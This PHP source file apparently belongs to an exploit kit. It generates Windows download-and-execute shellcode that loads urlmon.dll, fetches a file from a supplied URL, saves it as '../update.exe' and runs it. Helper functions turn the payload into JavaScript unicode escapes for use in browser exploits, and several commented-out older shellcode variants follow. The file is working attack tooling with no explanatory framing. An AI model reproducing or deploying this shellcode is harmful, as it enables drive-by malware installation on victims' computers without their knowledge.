<?


include_once("util.php");

function uescape($s){
	$out = "";
	$res = strtoupper(bin2hex($s));
	$g = round(strlen($res) / 4);
	if ($g != (strlen($res) / 4)){
		$res .= "00";
	}
	for ($i = 0; $i < strlen($res); $i+=4){
		$out .= "\u" . substr($res, $i+2, 2) . substr($res, $i, 2);
	}
	return $out;
}

function shellcode_dl_exec_hex($url)
{
	$shellcode = str_to_hex(uescape(shellcode_dl_exec($url)));
	return $shellcode;
}

function shellcode_dl_exec_js($url)
{
	$shellcode = uescape(shellcode_dl_exec($url));
	return $shellcode;
}

function shellcode_dl_exec($url){
	

	$shellcode = "" .	
	"\xEB\x46\x5F\x31\xC9\x83\xE9\x01\x89\xFE\x30\xC0\x2C\x01\xF2\xAE".
	"\xFE\x47\xFF\x89\xFB\x30\xC0\x2C\x01\xF2\xAE\xFE\x47\xFF\x89\xFD".
	"\xF2\xAE\xFE\x47\xFF\xEB\x71\x60\x31\xC9\x64\x8B\x71\x30\x8B\x76".
	"\x0C\x8B\x76\x1C\x8B\x5E\x08\x8B\x56\x20\x8B\x36\x66\x39\x4A\x18".
	"\x75\xF2\x89\x5C\x24\x1C\x61\xC3\xEB\x5B\x60\x8B\x6C\x24\x24\x8B".
	"\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB".
	"\xE3\x34\x49\x8B\x34\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0".
	"\x74\x07\xC1\xCF\x12\x01\xC7\xEB\xF4\x3B\x7C\x24\x28\x75\xE1\x8B".
	"\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B".
	"\x01\xE8\x89\x44\x24\x1C\x61\xC3\xEB\x54\x31\xD2\x52\x52\x53\x55".
	"\x52\xFF\xD0\xEB\x1A\xEB\x5D\xE8\x7B\xFF\xFF\xFF\xBA\xE7\xBA\x8B".
	"\xC4\x52\x50\xE8\x92\xFF\xFF\xFF\x31\xD2\x52\xFF\xD0\xEB\x2D\xE8".
	"\x63\xFF\xFF\xFF\xBA\xAA\x6E\x8A\xF3\x52\x50\xE8\x7A\xFF\xFF\xFF".
	"\x31\xD2\x83\xC2\xFF\x83\xEA\xFA\x52\x53\xFF\xD0\xEB\xC9\xBA\x47".
	"\x7D\xC8\xA0\x52\x50\xE8\x60\xFF\xFF\xFF\xEB\xAE\xEB\x5D\xE8\x34".
	"\xFF\xFF\xFF\xBA\x12\xCE\x1A\x09\x52\x50\xE8\x4B\xFF\xFF\xFF\x56".
	"\xFF\xD0\xEB\xDA\xE8\xF9\xFE\xFF\xFF\x75\x72\x6C\x6D\x6F\x6E\x2E".
	"\x64\x6C\x6C\xFF" . "../update.exe" . "\xFF".  $url . 
	"\xFF\xCD\x03";


	//"\xeb\x42\x5f\xb9\xff\xff\xff\xff\x89\xfe\xb0\xff\xf2\xae\xfe\x47".
	//"\xff\x89\xfb\xb0\xff\xf2\xae\xfe\x47\xff\x89\xfd\xf2\xae\xfe\x47".
	//"\xff\xeb\x74\x60\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c".
	//"\x8b\x5e\x08\x8b\x56\x20\x8b\x36\x66\x39\x4a\x18\x75\xf2\x89\x5c".
	//"\x24\x1c\x61\xc3\xeb\x5e\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54".
	//"\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37\x49\x8b".
	//"\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xcf".
	//"\x0f\x01\xc7\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a".
	//"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01".
	//"\xe8\x89\x44\x24\x1c\x61\xc3\xeb\x5a\x31\xd2\x52\x52\x53\x55\x52".
	//"\xff\xd0\xeb\x1a\xeb\x63\xe8\x78\xff\xff\xff\xba\xf8\x99\x3f\x3c".
	//"\x52\x50\xe8\x8f\xff\xff\xff\x31\xd2\x52\xff\xd0\xeb\x33\xe8\x60".
	//"\xff\xff\xff\xba\xe3\x1e\x12\x10\x52\x50\xe8\x77\xff\xff\xff\x31".
	//"\xd2\x81\xc2\xff\xff\xff\xff\x81\xea\xfa\xff\xff\xff\x52\x53\xff".
	//"\xd0\xeb\xc3\xba\x33\x9d\x5e\x72\x52\x50\xe8\x57\xff\xff\xff\xeb".
	//"\xa8\xeb\x5a\xe8\x2b\xff\xff\xff\xba\x6c\x43\x3c\x58\x52\x50\xe8".
	//"\x42\xff\xff\xff\x56\xff\xd0\xeb\xda\xe8\xf4\xfe\xff\xff\x75\x72".
	//"\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c\xff" . "update.exe" . "\xff" . $url . "\xff\xcd\x03";
	
	//"\xeb\x42\x5f\xb9\xff\xff\xff\xff\x89\xfe\xb0\xff\xf2\xae\xfe\x47" .
	//"\xff\x89\xfb\xb0\xff\xf2\xae\xfe\x47\xff\x89\xfd\xf2\xae\xfe\x47" .
	//"\xff\xeb\x74\x60\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c" .
	//"\x8b\x5e\x08\x8b\x56\x20\x8b\x36\x66\x39\x4a\x18\x75\xf2\x89\x5c" .
	//"\x24\x1c\x61\xc3\xeb\x7c\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54" .
	//"\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37\x49\x8b" .
	//"\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xcf" .
	//"\x0d\x01\xc7\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a" .
	//"\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" .
	//"\xe8\x89\x44\x24\x1c\x61\xc3\xe8\x87\xff\xff\xff\xba\x8e\x4e\x0e" .
	//"\xec\x52\x50\xe8\x9e\xff\xff\xff\x56\xff\xd0\xba\x36\x1a\x2f\x70" .
	//"\x52\x50\xe8\x8f\xff\xff\xff\x31\xd2\x52\x52\x53\x55\x52\xff\xd0" .
	//"\xeb\x1a\xeb\x3d\xe8\x5a\xff\xff\xff\xba\x7e\xd8\xe2\x73\x52\x50" .
	//"\xe8\x71\xff\xff\xff\x31\xd2\x52\xff\xd0\xeb\x69\xe8\x42\xff\xff" .
	//"\xff\xba\x98\xfe\x8a\x0e\x52\x50\xe8\x59\xff\xff\xff\x31\xd2\x81" .
	//"\xc2\xff\xff\xff\xff\x81\xea\xfa\xff\xff\xff\x52\x53\xff\xd0\xeb" .
	//"\xc3\xe8\xfc\xfe\xff\xff\x75\x72\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c" .
	//"\xff" . $drop_filename . "\xff" . $url . "\xff\xcd\x03";
	//"\xeb\x72\x60\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b".
	//"\x5e\x08\x8b\x56\x20\x8b\x36\x66\x39\x4a\x18\x75\xf2\x89\x5c\x24".
	//"\x1c\x61\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01".
	//"\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x37\x49\x8b\x34\x8b\x01".
	//"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x0a\xc1\xcf\x0d\x01\xc7".
	//"\xe9\xf1\xff\xff\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a\x24\x01\xeb".
	//"\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44".
	//"\x24\x1c\x61\xc3\xeb\x6d\x5f\xb9\xff\xff\xff\xff\x89\xfe\xb0\xff".
	//"\xf2\xae\xfe\x47\xff\x89\xfb\xb0\xff\xf2\xae\xfe\x47\xff\x89\xfd".
	//"\xf2\xae\xfe\x47\xff\xe8\x68\xff\xff\xff\xba\x8e\x4e\x0e\xec\x52".
	//"\x50\xe8\x7d\xff\xff\xff\x56\xff\xd0\xba\x36\x1a\x2f\x70\x52\x50".
	//"\xe8\x6e\xff\xff\xff\x31\xd2\x52\x52\x53\x55\x52\xff\xd0\xe8\x3f".
	//"\xff\xff\xff\xba\x98\xfe\x8a\x0e\x52\x50\xe8\x54\xff\xff\xff\x31".
	//"\xd2\x81\xc2\xff\xff\xff\xff\x81\xea\xfa\xff\xff\xff\x52\x53\xff".
	//"\xd0\xeb\x02\xeb\x16\xe8\x18\xff\xff\xff\xba\x7e\xd8\xe2\x73\x52".
	//"\x50\xe8\x2d\xff\xff\xff\x31\xd2\x52\xff\xd0\xe8\x76\xff\xff\xff".
	//"\x75\x72\x6c\x6d\x6f\x6e\x2e\x64\x6c\x6c\xff\x75\x70\x2e\x65\x78".
	//"\x65\xff" . $url . "\xff";

	return $shellcode;
	
}

?>
